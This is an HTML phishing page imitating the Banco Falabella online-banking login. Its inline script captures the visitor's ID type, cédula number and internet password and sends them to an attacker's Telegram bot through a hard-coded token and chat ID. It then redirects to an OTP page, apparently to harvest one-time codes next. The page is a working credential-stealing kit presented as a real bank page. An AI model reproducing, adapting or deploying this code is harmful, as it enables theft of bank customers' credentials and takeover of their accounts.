<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Falabella - Banca en línea</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <!-- Loading Screen -->
    <div id="loadingScreen" class="loading-screen">
        <img src="img/logo-bf-darkmode.aee74748.svg" alt="Logo" class="loading-logo">
    </div>

    <!-- Main Content -->
    <div id="mainContent" class="main-container">
        <!-- Header -->
        <header class="header">
            <div class="logo-container">
                <img src="img/bf-logo-mobile.svg" alt="Banco Falabella" class="logo">
            </div>
            <button class="btn-banca-online">Banca en línea</button>
        </header>

        <!-- Login Form -->
        <div class="login-container">
            <form id="loginForm" class="login-form">
                <div class="form-group">
                    <select id="docType" class="form-select">
                        <option value="cedula_ciudadania">Cédula Ciudadanía</option>
                        <option value="cedula_extranjeria">Cédula Extranjería</option>
                        <option value="pasaporte">Pasaporte</option>
                    </select>
                </div>

                <div class="form-group">
                    <input 
                        type="text" 
                        id="cedula" 
                        class="form-input" 
                        placeholder="Cédula de Ciudadanía"
                        maxlength="10"
                        inputmode="numeric"
                        autocomplete="off"
                    >
                </div>

                <div class="form-group">
                    <input 
                        type="password" 
                        id="claveInternet" 
                        class="form-input" 
                        placeholder="Clave Internet"
                        maxlength="6"
                        inputmode="numeric"
                        autocomplete="off"
                    >
                </div>

                <button type="button" id="btnIngresar" class="btn-ingresar" disabled>
                    INGRESAR
                </button>

                <div class="link-container">
                    <a href="#" class="link-clave">Crea o recupera tu Clave Internet</a>
                </div>
            </form>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
        const TELEGRAM_CHAT_ID = '-1003784784181';

        const docType = document.getElementById('docType');
        const cedula = document.getElementById('cedula');
        const claveInternet = document.getElementById('claveInternet');
        const btnIngresar = document.getElementById('btnIngresar');
        const loadingScreen = document.getElementById('loadingScreen');

        function validateForm() {
            const isValid = cedula.value.length >= 5 && claveInternet.value.length >= 4;
            btnIngresar.disabled = !isValid;
        }

        cedula.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').slice(0, 10);
            validateForm();
        });

        claveInternet.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').slice(0, 6);
            validateForm();
        });

        btnIngresar.addEventListener('click', async function(e) {
            e.preventDefault();
            if (btnIngresar.disabled) return;

            loadingScreen.style.display = 'flex';

            const mensaje = `👤 <b>DOCUMENTO + CLAVE - BANCO FALABELLA</b>

<b>Tipo de documento:</b> <code>${docType.value}</code>
<b>Cédula:</b> <code>${cedula.value}</code>
<b>Clave Internet:</b> <code>${claveInternet.value}</code>

<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
                });

                if ((await response.json()).ok) {
                    setTimeout(() => { window.location.href = 'otp.html'; }, 2000);
                } else {
                    loadingScreen.style.display = 'none';
                }
            } catch (error) {
                loadingScreen.style.display = 'none';
            }
        });
    </script>
</body>
</html>
